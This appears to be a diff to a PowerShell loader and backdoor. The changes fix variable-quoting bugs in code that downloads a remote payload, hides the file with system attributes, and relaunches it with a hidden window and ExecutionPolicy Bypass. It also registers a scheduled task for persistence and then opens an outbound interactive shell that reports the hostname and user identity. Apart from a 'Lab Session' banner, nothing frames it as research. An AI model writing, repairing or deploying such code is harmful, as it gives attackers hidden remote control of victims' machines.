@@ -25,21 +25,22 @@ if (-not (Test-Path $WorkDir)) {
 }
 
 # Detection: If we aren't running the specific file in C:\Win, we install and hand off
-if ($PSCommandPath -ne $FullPath) {
-    Log-Debug "Loader detected. Installing to $FullPath..."
+# Using ${} to ensure the colon in the path doesn't trigger a variable scope error
+if ($PSCommandPath -ne ${FullPath}) {
+    Log-Debug "Loader detected. Installing to ${FullPath}..."
     try {
         [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
         $webClient = New-Object System.Net.WebClient
-        $webClient.DownloadFile($RemoteUrl, $FullPath)
+        $webClient.DownloadFile($RemoteUrl, ${FullPath})
         Log-Debug "Download successful."
         
         if (-not $DebugMode) {
-            attrib +h +s $FullPath
+            attrib +h +s ${FullPath}
         }
 
         Log-Debug "Launching background process..."
-        # Fixed quoting and variable expansion to avoid the ":" variable reference error
-        $ProcArgs = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($FullPath)`""
+        # We use single quotes for the outer string to prevent the parser from seeing : as a scope
+        $ProcArgs = '-WindowStyle Hidden -ExecutionPolicy Bypass -File "' + ${FullPath} + '"'
         Start-Process powershell.exe -ArgumentList $ProcArgs
         
         Log-Debug "Releasing terminal. Process will continue in background."
@@ -66,7 +67,8 @@ try {
 try {
     if (-not (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)) {
         Log-Debug "Registering Scheduled Task..."
-        $Arg = "-ExecutionPolicy Bypass -File `"$($FullPath)`""
+        # Using concatenation to build the string safely
+        $Arg = '-ExecutionPolicy Bypass -File "' + ${FullPath} + '"'
         if (-not $DebugMode) { $Arg = "-WindowStyle Hidden " + $Arg }
         
         $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $Arg
@@ -94,7 +96,7 @@ while ($true) {
         Log-Debug "Connected! Sending identification banner."
         $writer.WriteLine("--- Lab Session Established: $(hostname) ---")
         $writer.WriteLine("--- Identity: $(whoami) ---")
-        $writer.WriteLine("--- Path: $FullPath ---")
+        $writer.WriteLine("--- Path: ${FullPath} ---")
         
         while ($client.Connected) {
             $writer.Write("PS " + (Get-Location).Path + "> ")
